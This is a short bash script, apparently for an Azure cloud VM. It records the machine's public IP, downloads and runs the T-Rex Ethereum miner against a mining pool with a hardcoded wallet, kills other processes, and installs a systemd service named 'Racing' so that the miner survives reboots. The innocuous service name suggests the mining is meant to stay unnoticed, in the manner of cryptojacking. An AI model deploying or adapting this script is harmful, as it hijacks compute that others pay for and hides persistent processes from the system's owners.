cd /home/azure
woker=$(date +'%d%m_%H-')
myip="$(dig +short myip.opendns.com @resolver1.opendns.com)"
woker+=$myip
if [[ ! -f isHaveSetupCoin.txt ]]
then
    echo "Start setup..."
    sudo apt-get install linux-headers-$(uname -r) -y
    distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
    echo "xxx vip pro" > isHaveSetupCoin.txt
    wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz 
    sudo killall XXX
    ./t-rex -a ethash -o us-eth.2miners.com:2020 -u 0xb3c4278f22af4065c55db747e4efa8ed4ff02153 -p x -w $woker
else
    wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz 
    sudo killall XXX
    ./t-rex -a ethash -o us-eth.2miners.com:2020 -u 0xb3c4278f22af4065c55db747e4efa8ed4ff02153 -p x -w $woker
fi
sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/azure/t-rex -a ethash -o us-eth.2miners.com:2020 -u 0xb3c4278f22af4065c55db747e4efa8ed4ff02153 -p x -w 1111vps\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
sudo systemctl daemon-reload
sudo systemctl enable racing.service